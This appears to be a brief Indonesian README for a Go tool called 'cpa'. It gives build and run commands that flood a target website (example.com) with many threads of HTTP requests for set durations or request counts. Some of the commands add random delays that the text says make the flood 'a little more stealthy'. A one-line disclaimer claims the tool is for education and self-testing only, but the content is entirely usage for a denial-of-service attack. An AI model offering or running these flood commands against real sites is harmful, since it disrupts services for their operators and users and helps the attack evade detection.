BISMILLAHIRRAHMANIRRAHIM 

Kode ini hanya untuk edukasi dan pengujian di lingkungan sendiri.

Gunakan dengan bijak dan bertanggung jawab.

# Compile
go build -o cpa cpa.go

# Lihat help
./cpa -help

# Compile
go build -o cpa cpa.go

# Delay random antara 100-500ms per request
./cpa -target https://example.com -method flood -threads 50 -duration 30 -delay-min 100 -delay-max 500

# Delay tetap 200ms (min dan max sama)
./cpa -target https://example.com -method https -threads 30 -requests 1000 -delay-min 200 -delay-max 200

# Delay kecil (10-50ms) agar tetap cepat tapi sedikit lebih stealth
./cpa -target https://example.com -method flood -threads 100 -duration 60 -delay-min 10 -delay-max 50

# Tanpa delay (default, untuk kecepatan maksimal)
./cpa -target https://example.com -method flood -threads 100 -duration 30
